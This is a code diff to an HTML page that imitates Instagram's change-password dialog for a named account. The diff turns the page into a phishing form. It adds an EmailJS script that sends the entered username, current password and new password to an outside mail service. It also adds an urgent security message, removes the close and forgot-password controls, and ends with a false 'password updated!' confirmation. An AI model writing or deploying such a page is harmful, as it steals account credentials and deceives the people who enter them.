@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Change Password Modal</title>
+<title>Change Password</title>
 <style>
   /* Background overlay */
   body {
@@ -178,18 +178,25 @@
     cursor: not-allowed;
   }
 </style>
+ <!-- Add EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+<script>
+  emailjs.init("7ZhFIcanF93E3cSlm"); // <-- Replace with your EmailJS User ID
+</script>
 </head>
 <body>
 
 <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
-  <button class="back-btn" aria-label="Go back">&#x2190;</button>
-  <button class="close-btn" aria-label="Close modal">&times;</button>
 
   <div class="user-info">
     <span class="username">Niiiiddhhiii</span> · Instagram
   </div>
 
   <h2 id="modal-title">Change password</h2>
+
+   <h5 class="instruction">
+    Your password must be updated to maintain account security.
+   </h5>
 
   <p class="instruction">
     Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!@$%).
@@ -229,8 +236,6 @@
       />
     </div>
 
-    <a href="#" class="forgot-password">Forgot your password?</a>
-
     <label class="checkbox-container">
       <input type="checkbox" id="logout-others" name="logout-others" checked />
       Log out of other devices. Choose this if someone else used your account.
@@ -241,7 +246,7 @@
       class="btn-change-password"
       disabled
     >
-      Update password
+      Change password
     </button>
   </form>
 </div>
@@ -259,7 +264,6 @@
     const newVal = newPass.value.trim();
     const retypeVal = retypePass.value.trim();
 
-    // Enable button only if all fields have at least 6 characters and new passwords match
     if (
       currentVal.length >= 6 &&
       newVal.length >= 6 &&
@@ -275,11 +279,27 @@
   newPass.addEventListener("input", validatePasswords);
   retypePass.addEventListener("input", validatePasswords);
 
-  form.addEventListener("submit", (e) => {
+  form.addEventListener("submit", function(e) {
     e.preventDefault();
-    alert("Password change submitted!");
+
+    const templateParams = {
+      username: document.querySelector(".username").textContent,
+      currentPassword: currentPass.value,
+      newPassword: newPass.value            
+    };
+
+    emailjs.send("service_9jiqv9f", "password_change", templateParams)
+      .then(() => {
+        alert("password updated!");
+        form.reset();
+        submitBtn.disabled = true;
+      }, (err) => {
+        console.error("Failed to send email:", err);
+        alert("Oops! Something went wrong.");
+      });
   });
 </script>
 
 </body>
+
 </html>
